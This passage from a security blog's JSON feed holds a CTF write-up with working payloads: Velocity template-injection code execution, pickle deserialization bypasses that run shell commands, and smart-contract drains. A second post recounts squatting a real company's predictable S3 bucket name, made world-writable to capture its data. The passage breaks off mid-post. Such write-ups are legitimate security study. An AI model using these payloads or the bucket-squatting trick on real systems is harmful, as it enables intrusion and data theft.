{
	"version": "https://jsonfeed.org/version/1.1",
	"title": "ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ",
	"language": "en",
	"home_page_url": "https://blog.caller.xyz/",
	"feed_url": "https://blog.caller.xyz/feed/feed.json",
	"description": "I am writing about my experiences as a naval navel-gazer.",
	"author": {
		"name": "Your Name Here",
		"url": "https://example.com/about-me/"
	},
	"items": [
		{
			"id": "https://blog.caller.xyz/htb-cyber-apocalypse-ctf-2024-writeup/",
			"url": "https://blog.caller.xyz/htb-cyber-apocalypse-ctf-2024-writeup/",
			"title": "HTB Cyber Apocalypse CTF 2024 Writeup",
			"content_html": "<p>I had very little time to spend on HTB Cyber Apocalypse 2024, so just played with some easy challenges.</p>\n<h2 id=\"web-labyrinth-linguist\" tabindex=\"-1\">Web: Labyrinth Linguist <a class=\"header-anchor\" href=\"https://blog.caller.xyz/htb-cyber-apocalypse-ctf-2024-writeup/\">#</a></h2>\n<p>(Easy, 300)</p>\n<p>Java. Apache Velocity 1.7.0. There is a template injection vulnerability.</p>\n<p>I tried using <code>#include</code> and <code>#parse</code> directives, but I couldn't get a path traversal.</p>\n<p>According to the code, we have one variable in our context: if you send <code>$name</code> you get back <code>World</code>.</p>\n<p>More interestingly, <code>${name.getClass()}</code>returns <code>class java.lang.String</code>. From here we can pretty much do anything we want. Calling a shell command in Java is annoying, but here is one way to get the file listing of the root directory:</p>\n<pre class=\"language-velocity\" tabindex=\"0\"><code class=\"language-velocity\"><span class=\"token directive\"><span class=\"token keyword\">#set</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token operator\">=</span><span class=\"token variable\">$<span class=\"token punctuation\">{</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.Runtime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ls /\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span><span class=\"token punctuation\">)</span></span>\n<span class=\"token variable\">$<span class=\"token punctuation\">{</span>x<span class=\"token punctuation\">.</span><span class=\"token function\">waitFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span>\n<span class=\"token directive\"><span class=\"token keyword\">#set</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$<span class=\"token punctuation\">{</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.io.InputStreamReader\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token punctuation\">)</span></span>\n<span class=\"token directive\"><span class=\"token keyword\">#set</span></span> (<span class=\"token variable\">$b</span>=<span class=\"token variable\">$<span class=\"token punctuation\">{</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.io.BufferedReader\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>$c<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>$x<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span>)\n<span class=\"token variable\">$<span class=\"token punctuation\">{</span>b<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span>\n<span class=\"token variable\">$<span class=\"token punctuation\">{</span>b<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span>\n<span class=\"token variable\">$<span class=\"token punctuation\">{</span>b<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span></code></pre>\n<p>Then cat the flag.</p>\n<p>I'm not sure if the declared constructor indices are portable across different machines or even survive restarts.</p>\n<h2 id=\"forensics-phreaky\" tabindex=\"-1\">Forensics: Phreaky <a class=\"header-anchor\" href=\"https://blog.caller.xyz/htb-cyber-apocalypse-ctf-2024-writeup/\">#</a></h2>\n<p>(Medium, 300)</p>\n<p>Browsing the pcap in Wireshark, the SMTP traffic stood out, with 15 messages of the format:</p>\n<pre class=\"language-notsure\" tabindex=\"0\"><code class=\"language-notsure\">Date: Wed, 06 Mar 2024 14:59:12 +0000\nFrom: caleb@thephreaks.com(Caleb)\nTo: resources@thetalents.com\nSubject: Secure File Transfer\nMessage-ID: <20240306145912.3RkED%caleb@thephreaks.com>\nUser-Agent: s-nail v14.9.23\nMIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=\"\n\nThis is a multi-part message in MIME format.\n\n--=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=\nContent-Type: text/plain; charset=us-ascii\nContent-Disposition: inline\nContent-ID: <20240306145912.g2I1r%caleb@thephreaks.com>\n\nAttached is a part of the file. Password: S3W8yzixNoL8\n\n--=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=\nContent-Type: application/zip\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; \n filename*0=\"caf33472c6e0b2de339c1de893f78e67088cd6b1586a581c6f8e87b5596\";\n filename*1=\"efcfd.zip\"\nContent-ID: <20240306145912.Emuab%caleb@thephreaks.com>\n\nUEsDBBQACQAIAGZ3ZlhwRyBT2gAAAN0AAAAWABwAcGhyZWFrc19wbGFuLnBkZi5wYXJ0MVVUCQAD\nwIToZcCE6GV1eAsAAQToAwAABOgDAAA9mPwEVmy1t/sLJ62NzXeCBFSSSZppyIzvPXL++cJbuCeL\nnP4XXiAK9/HZL9xRw4LjlDf5eDd6BgBOKZqSn6qpM6g1WKXriS7k3lx5VkNnqlqQIfYnUdOCnkD/\n1vzCyhuGdHPia5lmy0HoG+qdXABlLyNDgxvB9FTOcXK7oDHBOf3kmLSQFdxXsjfooLtBtC+y4gdB\nxB4V3bImQ8TB5sPY55dvEKWCJ34CzRJbgIIirkD2GDIoQEHznvJA7zNnOvce1hXGA2+P/XmHe+4K\ntL/fmrWMVpQEd+/GQlBLBwhwRyBT2gAAAN0AAABQSwECHgMUAAkACABmd2ZYcEcgU9oAAADdAAAA\nFgAYAAAAAAAAAAAAtIEAAAAAcGhyZWFrc19wbGFuLnBkZi5wYXJ0MVVUBQADwIToZXV4CwABBOgD\nAAAE6AMAAFBLBQYAAAAAAQABAFwAAAA6AQAAAAA=\n\n--=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=--</code></pre>\n<p>This message is reassembled from multiple SMTP packets, so exporting the SMTP packets will be a bit of a mess with packet headers in the middle.</p>\n<p>Instead, use the <code>imf</code> filter in Wireshark and then File &gt; Export Objects &gt; IMF to get the <code>.eml</code> files. On the CLI, this is:</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\">tshark <span class=\"token parameter variable\">-r</span> phreaky.pcap --export-objects imf,.</code></pre>\n<p>The zip file is password-protected. Each one contains a phreaks_plan.pdf.part1 file.</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token comment\"># Get all the parts</span>\n<span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">f</span> <span class=\"token keyword\">in</span> *.eml<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">do</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PWD</span></span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">cat</span> <span class=\"token string\">\"<span class=\"token variable\">$f</span>\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token string\">'assword:'</span> <span class=\"token operator\">|</span> <span class=\"token function\">sed</span> <span class=\"token string\">'s/^.*: //g'</span> <span class=\"token operator\">|</span> <span class=\"token function\">tr</span> <span class=\"token parameter variable\">-d</span> <span class=\"token string\">'\\r'</span><span class=\"token variable\">)</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">cat</span> <span class=\"token variable\">$f</span> <span class=\"token operator\">|</span> <span class=\"token function\">sed</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'/^UEs/,/^\\s$/{p}'</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token string\">'^...'</span> <span class=\"token operator\">|</span> <span class=\"token function\">tr</span> <span class=\"token parameter variable\">-d</span> <span class=\"token string\">'\\n'</span> <span class=\"token operator\">|</span> <span class=\"token function\">tr</span> <span class=\"token parameter variable\">-d</span> <span class=\"token string\">'\\r'</span> <span class=\"token operator\">|</span> base64 <span class=\"token parameter variable\">-d</span> <span class=\"token operator\">></span> tmp.zip<span class=\"token punctuation\">;</span>\n<span class=\"token function\">unzip</span> <span class=\"token parameter variable\">-P</span> <span class=\"token string\">\"<span class=\"token environment constant\">$PWD</span>\"</span> tmp.zip<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">done</span>\n\n<span class=\"token comment\"># Reassemble PDF</span>\n<span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">i</span> <span class=\"token keyword\">in</span> <span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">seq</span> <span class=\"token number\">1</span> <span class=\"token number\">15</span><span class=\"token variable\">`</span></span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span> <span class=\"token function\">cat</span> <span class=\"token string\">\"phreaks_plan.pdf.part<span class=\"token variable\">$i</span>\"</span> <span class=\"token operator\">>></span> final.pdf<span class=\"token punctuation\">;</span> <span class=\"token keyword\">done</span></code></pre>\n<p>The flag is shown within the pdf.</p>\n<h2 id=\"blockchain-russian-roulette\" tabindex=\"-1\">Blockchain: Russian Roulette <a class=\"header-anchor\" href=\"https://blog.caller.xyz/htb-cyber-apocalypse-ctf-2024-writeup/\">#</a></h2>\n<p>(Very easy, 300)</p>\n<p>One server is an ethereum network RPC server. The other is for the challenge:</p>\n<pre class=\"language-notsure\" tabindex=\"0\"><code class=\"language-notsure\">$ nc 94.237.60.74 59101\n1 - Connection information\n2 - Restart Instance\n3 - Get flag\naction? 1\n\nPrivate key: 0xf7ddb435cbfdbf8287f834b2d65fa3fcef714e0897a840befdd77869a9558524\nAddress: 0x5b4F2566D787E7F793D6f51f60Fea29E29464374\nTarget contract: 0xab6cA8131A2FF2002bebeB52dfc9E2F716c116BA\nSetup contract: 0xA0DadA13fe4C906474AcD7BE42d356631c4f459F</code></pre>\n<p>The contract Setup has deployed a RussianRoulette contract instance with 10 ETH.\nThe contract RussianRoulette contract has a <code>pullTrigger</code> function. If the condition that <code>uint256(blockhash(block.number - 1)) % 10 == 7</code>, is satisfied (random with a 10% chance of being hit), the contract will self-destruct and send those 10 ETH to the caller <code>selfdestruct(payable(msg.sender))</code>.</p>\n<p>Simply calling the contract several times will eventually pass the condition.</p>\n<p>Use npm to install <code>eth-cli</code>. Add the network <code>eth network:add HTB --id=69 --label=HTB --url=http://94.237.60.74:42487</code>.</p>\n<p>Compile the contracts... can use remix IDE. All we need is the ABI. Save the ABI files. Then in the REPL call the contract until success. I chose a large gas amount (lower amounts failed).</p>\n<pre class=\"language-notsure\" tabindex=\"0\"><code class=\"language-notsure\">$ eth repl -n HTB --pk 0xf7ddb435cbfdbf8287f834b2d65fa3fcef714e0897a840befdd77869a9558524 ./RussianRoulette.abi@0xab6cA8131A2FF2002bebeB52dfc9E2F716c116BA ./Setup.abi@0xA0DadA13fe4C906474AcD7BE42d356631c4f459F\n\nHTB> Setup.methods.isSolved()\nfalse\nHTB> RussianRoulette.methods.pullTrigger().send({from: \"0x5b4F2566D787E7F793D6f51f60Fea29E29464374\", gas: 214320})\n{\n  transactionHash: '0x6dc3f0ac880fe583a910ccfdafe3e6a270cb1caaed97867c81cde38cdc2860f4',\n  transactionIndex: 0,\n  blockHash: '0xb6bc29b9228d35401350d64b5ec084d4bfee5744b30723de2e9283fcfcbe0773',\n  blockNumber: 2,\n  cumulativeGasUsed: 21720,\n  gasUsed: 21720,\n  effectiveGasPrice: '0x3b9aca00',\n  from: '0x5b4f2566d787e7f793d6f51f60fea29e29464374',\n  to: '0xab6ca8131a2ff2002bebeb52dfc9e2f716c116ba',\n  contractAddress: null,\n  logsBloom: '0x000000...0000',\n  status: true,\n  type: '0x0',\n  depositNonce: null,\n  events: {}\n}\nHTB> setup.methods.isSolved()\nfalse\nHTB> BigInt('0xb6bc29b9228d35401350d64b5ec084d4bfee5744b30723de2e9283fcfcbe0773') % BigInt(10)\n7n    /* so will succeed on next call */\nHTB> RussianRoulette.methods.pullTrigger().send({from: \"0x5b4F2566D787E7F793D6f51f60Fea29E29464374\", gas: 214320})\n{...}\nHTB> setup.methods.isSolved()\ntrue</code></pre>\n<p>For some reason, when trying to use Remix + Metamask to call the functions, each time we successfully hit the success condition there was some error. Using <code>eth-cli</code>, however, seemed to work.</p>\n<h2 id=\"blockchain-lucky-faucet\" tabindex=\"-1\">Blockchain: Lucky Faucet <a class=\"header-anchor\" href=\"https://blog.caller.xyz/htb-cyber-apocalypse-ctf-2024-writeup/\">#</a></h2>\n<p>(Easy, 325)</p>\n<p>You can slowly extract money from the contract, but if you use it as expected you can only get 100M wei == 0.1 Gwei == 0.0000000001 ETH (1 ETH = 10^18 wei) at a time which is completely infeasible. We need to drain at least 10 ETH to get the flag. Clearly the challenge has something to do with overflows and casting negative signed ints into uints.</p>\n<pre class=\"language-solidity\" tabindex=\"0\"><code class=\"language-solidity\"><span class=\"token builtin\">int256</span> randomInt <span class=\"token operator\">=</span> <span class=\"token builtin\">int256</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>Blockhash is a bytes32 which is usually interpreted as a <code>uint256</code>. By using a <code>int256</code> instead, a blockhash which begins with one of <code>[89abcdef]</code> will be negative (two's complement). For now let's assume we can't control the blockhash, but there is a 50% chance of it being a negative after each transaction.</p>\n<p>e.g. a blockhash of <code>0xffecd3bfdf712b3eec84f84ee44d6581580974c75b62b1d63deaf7f1f3103302</code> is:</p>\n<pre class=\"language-notsure\" tabindex=\"0\"><code class=\"language-notsure\">int256: -33875499935385412712089846607188198242036215631542560527268567685192994046\nuint256: 115758213737380810010858895162080719655027948450009021478930315440227936645890</code></pre>\n<p>Double-check the mod maths:</p>\n<pre class=\"language-notsure\" tabindex=\"0\"><code class=\"language-notsure\">123 % 10 == 3\n-123 % 10 == -3\n123 % -10 == 3\n-123 % -10 == -3</code></pre>\n<p>Actually, realise that we can set the bounds to be negative as well, as long as the conditions are met.</p>\n<p>In this way, we can use a very small positive upper bound like +2 and a slightly larger negative bound like -40,000 to ensure that on each call of the contract method we have <code>randomInt % (upperBound - lowerBound + 1) + lowerBound</code> being a small negative number (small chance that <code>lowerBound</code> is smaller in magnitude than <code>randomInt % (upperBound - lowerBound + 1)</code>).</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\">luckyFaucet<span class=\"token punctuation\">.</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">setBounds</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">from</span><span class=\"token operator\">:</span> me<span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">gas</span><span class=\"token operator\">:</span> <span class=\"token number\">20000000</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre>\n<p>When converted with <code>uint64(-value)</code> the amount becomes <code>(2 &lt;&lt; 64) - value</code> which is approximately 18.4 ETH. We can therefore run the contract method multiple times with a very high chance of extracting 18.4 ETH each time.</p>\n<pre class=\"language-notsure\" tabindex=\"0\"><code class=\"language-notsure\">HTB> eth.getBalance(luckyFaucet._address)\n'500000000000000000000'   // 500 ETH\n\nHTB> eth.getBalance(me)\n'4999999928819000000000'  // 5000 ETH</code></pre>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">doit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>counter <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>  <span class=\"token comment\">// about 30 so we don't run forever</span>\n    luckyFaucet<span class=\"token punctuation\">.</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">sendRandomETH</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">from</span><span class=\"token operator\">:</span> me<span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">gas</span><span class=\"token operator\">:</span> <span class=\"token number\">2000000</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span>doit<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre>\n<pre class=\"language-notsure\" tabindex=\"0\"><code class=\"language-notsure\">HTB> eth.getBalance(luckyFaucet._address)\n'481553255926290448625'   // 482 ETH\n\nHTB> eth.getBalance(me)\n'5018446618094709551375'  // 5018 ETH\n\n...\n\nHTB> eth.getBalance(luckyFaucet._address)\n'463106511852580897550'   // 463 ETH\n\nHTB> eth.getBalance(me)\n'5036893331705419102450'  // 5037 ETH\n\n...\n...\n\nHTB> eth.getBalance(luckyFaucet._address)\n'1937910009842115787'     // 2 ETH\n\nHTB> eth.getBalance(me)\n'5498060958732157884213'  // 5498 ETH\n\nHTB> setup.methods.isSolved()\ntrue</code></pre>\n<p>It seems impossible to grab the remaining 2 ETH from this point. The smallest amount we can request (by setting lower and upper bounds to both be equal to -2^63) is 2^63 = 0b10000000... = 9,223,372,036,854,775,808 = 9.2 ETH. Anyway, the challenge only requires 10 ETH to be extracted. The largest is 18,446,744,073,709,551,615 = 18.4 ETH by setting the bounds to be equal to -1 (approx what was done above, but a more sensible way to do it).</p>\n<p>By having set the extracted amount to a factor of 500 such as 10 ETH each time from the start (bounds = -(2^64 - 10^19) = -8446744073709551616), we would have been able to extract every last wei of cryptocash.</p>\n<h2 id=\"were-pickle-phreaks-revenge\" tabindex=\"-1\">We're Pickle Phreaks &amp; Revenge <a class=\"header-anchor\" href=\"https://blog.caller.xyz/htb-cyber-apocalypse-ctf-2024-writeup/\">#</a></h2>\n<p>We have a <code>pickle.Unpickler</code> with a <code>find_class(self, module, name)</code> which restricts <code>module</code> to <code>__main__</code> or <code>app</code> and prevents <code>name</code> from starting with <code>__builtins__</code>.</p>\n<p>We notice that <code>app</code> imports <code>random</code> which itself imports <code>os</code>, so we can call <code>app.random._os.system(&quot;cat flag.txt&quot;)</code>. I made a pickle:</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token string\">b'capp\\nrandom._os.system\\n'</span>\n<span class=\"token operator\">+</span>   <span class=\"token string\">b'Vcat flag.txt\\n'</span>\n<span class=\"token operator\">+</span> <span class=\"token string\">b'\\x85R'</span>\n<span class=\"token operator\">+</span> <span class=\"token string\">b'.'</span></code></pre>\n<p>The <code>c</code> opcode, defined in <a href=\"https://github.com/python/cpython/blob/9a388b9a64927c372d85f0eaec3de9b7320a6fb5/Lib/pickletools.py#L1923-L1939\">pickletools.py</a> should load an object onto the stack. But it didn't work because it was not calling <code>find_class</code> recursively. Instead, it complains that it can't find <code>random._os.system</code>. The reason is that we haven't set the <a href=\"https://github.com/python/cpython/blob/aa7bcf284f006434b07839d82f325618f7a5c06c/Lib/pickle.py#L1575\">pickle protocol level to 4 or higher</a> which then enables the recursive code path. A quick and dirty way to do that is prepending the following header:</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\">header <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x80\\x05\\x95'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pickle_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00'</span></code></pre>\n<p>In &quot;revenge&quot;, the <code>random</code> module is banned.</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\">UNSAFE_NAMES <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'__builtins__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'random'</span><span class=\"token punctuation\">]</span></code></pre>\n<p>There are plenty of ways to bypass this. I chose to overwrite the <code>UNSAFE_NAMES</code> list.</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token string\">b'capp\\npickle.__globals__.__setitem__\\n'</span>\n<span class=\"token operator\">+</span>   <span class=\"token string\">b'VUNSAFE_NAMES\\n'</span>\n<span class=\"token operator\">+</span>   <span class=\"token string\">b'V\\n'</span>\n<span class=\"token operator\">+</span> <span class=\"token string\">b'\\x86R'</span>\n<span class=\"token operator\">+</span> <span class=\"token string\">b'0'</span>\n<span class=\"token operator\">+</span> original</code></pre>\n<p>where <code>V</code> as before is a newline-terminated string. Rather than creating an empty list, I just set it to a string which is also iterable so <code>for name_ in UNSAFE_NAMES</code> still works. We need <code>0</code> to pop the result off the stack before running the original pickle code, and use <code>\\x86</code> to create a tuple instead of <code>\\x85</code> as we have two arguments to the function.</p>\n<p>This acts as:</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\">app<span class=\"token punctuation\">.</span>pickle<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">.</span>__setitem__<span class=\"token punctuation\">(</span><span class=\"token string\">\"UNSAFE_NAMES\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">.</span>_os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"cat flag.txt\"</span><span class=\"token punctuation\">)</span></code></pre>\n",
			"date_published": "2024-03-14T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/cheeky-bucket-squatting-defeated-by-terraform/",
			"url": "https://blog.caller.xyz/cheeky-bucket-squatting-defeated-by-terraform/",
			"title": "Cheeky Bucket Squatting Defeated by Terraform",
			"content_html": "<p>A failed bounty experiment of mine. Having previously pwned a company's AWS, I had a list of their S3 buckets and more importantly their bucket naming scheme e.g. <code>TARGETNAME-SERVICENAME-staging</code> and <code>TARGETNAME-SERVICENAME-prod</code>.</p>\n<p>If you can generate a list of possible bucket names, you can easily check if they exist. The simplest is to make an HTTP request to BUCKETNAME.s3.amazonaws.com and see if the response is <code>NoSuchBucket</code>, but when automated it is much faster to use DNS lookups rather than HTTP.</p>\n<p>I can maintain a list of words that the target could plausibly use in their bucket names. By keeping an eye on the target's blog, announcements and changes to bundled JavaScript source code, we can add some names of new features and services to our list and regularly enumerate looking for new buckets.</p>\n<p>Like all research, it was initially exciting and then felt like a waste of time until I spotted a new bucket for a newly announced feature: <code>TARGETNAME-NEWSERVICENAME-results-staging</code>. Most excitingly, <code>TARGETNAME-NEWSERVICENAME-results-prod</code> had not yet been claimed. That meant that I could use my own AWS account to claim the bucket. I made the permissions as open as possible in the hope that the target shrugs at the bucket already existing and just starts using it, storing their data in my AWS account. This involved using the ACL to give <code>http://acs.amazonaws.com/groups/global/AllUsers</code> full control and then adding a bucket policy which enables most of <code>s3:*</code> to principal <code>AWS:*</code>.</p>\n<p>In order to monitor the experiment, I enabled S3 bucket logging on my squatted bucket and waited.</p>\n<h2 id=\"results\" tabindex=\"-1\">Results <a class=\"header-anchor\" href=\"https://blog.caller.xyz/cheeky-bucket-squatting-defeated-by-terraform/\">#</a></h2>\n<p>The S3 bucket logs:</p>\n<pre><code>01:20:45 *IP_1* arn:aws:sts::*AWS_ACCOUNT_ID*:assumed-role/TerraformAccountAccessRole/aws-go-sdk-*TIMESTAMP1* REST.HEAD.BUCKET - &quot;HEAD / HTTP/1.1&quot; 200 - &quot;-&quot; &quot;APN/1.0 HashiCorp/1.0 Terraform/1.3.10 (+https://www.terraform.io) terraform-provider-aws/4.65.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go/1.44.251 (go1.19.8; linux; amd64)&quot; *BUCKETNAME*.s3.amazonaws.com\n04:00:30 *IP_2* arn:aws:sts::*AWS_ACCOUNT_ID*:assumed-role/TerraformAccountAccessRole/aws-go-sdk-*TIMESTAMP2* REST.HEAD.BUCKET - &quot;HEAD / HTTP/1.1&quot; 200 - &quot;-&quot; &quot;APN/1.0 HashiCorp/1.0 Terraform/1.3.10 (+https://www.terraform.io) terraform-provider-aws/4.65.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go/1.44.251 (go1.19.8; linux; amd64)&quot; *BUCKETNAME*.s3.amazonaws.com\n04:17:49 *IP_3* REST.GET.BUCKET - &quot;GET /*BUCKETNAME* HTTP/1.1&quot; 200 - &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;\n04:18:04 *10. IP_4* REST.GET.BUCKET - &quot;GET /*BUCKETNAME* HTTP/1.1&quot; 200 - &quot;-&quot; &quot;Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)&quot; s3.amazonaws.com\n04:18:08 *IP_5* REST.GET.BUCKET - &quot;GET /*BUCKETNAME* HTTP/1.1&quot; 200 - &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0&quot; s3.amazonaws.com\n04:24:40 *IP_3* REST.GET.BUCKET - &quot;GET /*BUCKETNAME* HTTP/1.1&quot; 200 - &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot; s3.amazonaws.com\n04:52:00 *IP_3* REST.GET.BUCKET - &quot;GET / HTTP/1.1&quot; 200 - &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot; *BUCKETNAME*.s3.amazonaws.com\n04:52:00 *IP_3* REST.GET.OBJECT favicon.ico &quot;GET /favicon.ico HTTP/1.1&quot; 404 NoSuchKey &quot;http://*BUCKETNAME*.s3.amazonaws.com/&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot; *BUCKETNAME*.s3.amazonaws.com\n08:54:02 *IP_6* REST.GET.BUCKET - &quot;GET / HTTP/1.1&quot; 200 - &quot;-&quot; &quot;Python/3.10 aiohttp/3.9.0&quot; *BUCKETNAME*.s3.amazonaws.com\n</code></pre>\n<p><em>Redacted information is surround by <code>*</code>.</em></p>\n<p>So the target finally attempted to terraform the prod bucket. The terraform role <code>HEAD</code>ed the bucket but it must have failed. Nearly 4 hours later they retried and 17 minutes after that failed an engineer with <em>IP_3</em> went to load the bucket listing in Safari. In utter surprise and confusion, the engineer posted the bucket link to Slack (as seen by the Slackbot user agent), followed by team member with <em>IP_5</em> loading the bucket listing in Firefox. Do they suspect malevolent forces are involved? Are they scared?</p>\n<h2 id=\"outcome\" tabindex=\"-1\">Outcome <a class=\"header-anchor\" 